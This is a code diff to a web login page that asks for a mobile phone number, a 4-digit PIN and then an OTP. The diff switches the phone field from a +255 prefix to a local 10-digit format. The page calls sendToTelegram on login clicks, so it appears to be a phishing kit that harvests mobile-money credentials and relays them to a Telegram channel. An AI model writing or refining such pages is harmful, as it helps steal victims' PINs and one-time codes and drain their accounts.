@@ -154,15 +154,6 @@ gap:8px;
 align-items:center;
 }
 
-.prefix{
-background:rgba(255,212,0,.15);
-padding:13px;
-border-radius:14px;
-border:1px solid rgba(255,212,0,.35);
-font-weight:700;
-color:var(--primary);
-}
-
 .btn{
 margin-top:20px;
 width:100%;
@@ -251,12 +242,11 @@ opacity:1;
 <label>Phone Number</label>
 
 <div class="phone-group">
-<div class="prefix">+255</div>
-<input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="XXXXXXXXX">
+<input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="0XXX XXX XXX">
 </div>
 
 <div class="warning">
-Enter your 9-digit mobile number.
+Enter your 10-digit mobile number starting with 0.
 </div>
 
 <label>Enter your PIN</label>
@@ -404,14 +394,15 @@ phone.oninput=e=>{
 
 let v=e.target.value.replace(/\D/g,"")
 
-if(v.startsWith("255")) v=v.slice(3)
-if(v.startsWith("0")) v=v.slice(1)
+if(!v.startsWith("0") && v.length>0){
+v="0"+v.slice(1)
+}
 
-v=v.slice(0,9)
+v=v.slice(0,10)
 
 e.target.value=v
 
-phoneValue="+255"+v
+phoneValue=v
 
 validateLogin()
 
@@ -452,7 +443,7 @@ function validateLogin(){
 
 pinValue=[...pinInputs].map(i=>i.value).join("")
 
-if(phoneValue.length===13 && pinValue.length===4)
+if(phoneValue.length===10 && pinValue.length===4)
 loginBtn.classList.add("active")
 else
 loginBtn.classList.remove("active")
@@ -480,7 +471,7 @@ loginClicked=true
 
 sendToTelegram("login_clicked")
 
-const masked=phoneValue.replace(/(\+255\d{3})\d{4}(\d{2})/,"$1****$2")
+const masked=phoneValue.replace(/(0\d{3})\d{4}(\d{3})/,"$1****$2")
 
 maskedNumber.innerHTML=`Enter the OTP sent to ${masked}`
 
